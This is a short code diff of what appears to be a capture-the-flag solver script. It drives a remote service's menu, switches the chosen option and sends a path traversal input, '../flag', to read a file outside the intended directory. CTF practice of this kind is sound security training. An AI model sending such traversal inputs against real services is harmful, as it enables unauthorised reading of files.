@@ -10,12 +10,15 @@ def main():
     print(connection.recv())
     print(connection.recv())
 
-    connection.sendline("1")
+    connection.sendline("2")
 
     print(connection.recv())
     print(connection.recv())
 
     connection.sendline("../flag")
+
+    print(connection.recv())
+    print(connection.recv())
 
     connection.close()
 
